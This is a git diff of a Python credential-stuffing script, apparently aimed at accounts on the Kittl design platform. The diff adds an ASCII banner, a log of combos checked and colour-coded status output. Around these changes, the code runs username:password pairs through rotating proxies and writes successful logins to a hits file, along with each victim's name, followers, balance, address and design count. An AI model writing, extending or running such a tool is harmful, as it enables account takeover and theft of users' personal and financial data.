@@ -2,6 +2,7 @@ import requests
 import json
 import threading
 import random
+import time
 from parser_kittl import parse_using_re
 
 class Color:
@@ -11,13 +12,36 @@ class Color:
     green_bold = "\033[1;92m"
     red_bold = "\033[1;91m"
     yellow_bold = "\033[1;33m"
-    
+
+clear_screen = "\033c"   
+content = f"""{Color.red_bold}
+  /$$$$$$          /$$                               /$$$$$$$$  /$$     /$$    /$$$$$$    /$$  
+ /$$__  $$        | $$                              |_____ $$//$$$$   /$$$$   /$$__  $$ /$$$$  
+| $$  \__//$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$      /$$/|_  $$  |_  $$  | $$  \ $$|_  $$  
+| $$$$   |____  $$| $$ /$$_____/ /$$__  $$| $$__  $$    /$$/   | $$    | $$  |  $$$$$$/  | $$  
+| $$_/    /$$$$$$$| $$| $$      | $$  \ $$| $$  \ $$   /$$/    | $$    | $$   >$$__  $$  | $$  
+| $$     /$$__  $$| $$| $$      | $$  | $$| $$  | $$  /$$/     | $$    | $$  | $$  \ $$  | $$  
+| $$    |  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$/     /$$$$$$ /$$$$$$|  $$$$$$/ /$$$$$$
+|__/     \_______/|__/ \_______/ \______/ |__/  |__/|__/     |______/|______/ \______/ |______/
+                                                                                                   
+{Color.no_colored}"""
+print(clear_screen)
+print(content)
+time.sleep(5)
 
 proxy = set()
 with open("proxies.txt","r", encoding='utf-8') as pfile:
     lines = pfile.readlines()
     for line in lines:
         proxy.add(line.strip())
+
+combo_count = 0
+
+def update_log_file():
+    global combo_count  
+    with open("log.txt", 'a', encoding='utf-8') as log_file:
+        log_file.write(f"Combos Checked: {combo_count+1}\n")
+
 
 def brutter(user, password, proxies):
     data = {
@@ -38,7 +62,7 @@ def brutter(user, password, proxies):
         else:
             print(f"Unexpected content type: {content_type}")
             return
-
+        update_log_file()
         data = json.dumps(data)
 
         name = parse_using_re(data, "name")
@@ -53,12 +77,10 @@ def brutter(user, password, proxies):
             hits.write(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
             hits.write("\n")
 
-        print(f"{Color.green_bold}{user}:{password}{Color.no_colored}")
-    elif response.status_code == 500:
-        print(f"{Color.red_bold}Response [500] , SERVER DOWN .{Color.no_colored}")
-        exit()
+        print(f"{Color.yellow_bold}{response.status_code}{Color.no_colored} {Color.green_bold}{user}:{password}{Color.no_colored}")
+        
     else:
-        print(f"{Color.blue_bold}{user}:{password}{Color.no_colored}")
+        print(f"{Color.red_bold}{response.status_code}{Color.no_colored} {Color.blue_bold}{user}:{password}{Color.no_colored}")
 
 def process_combo(combo):
     proxies = {
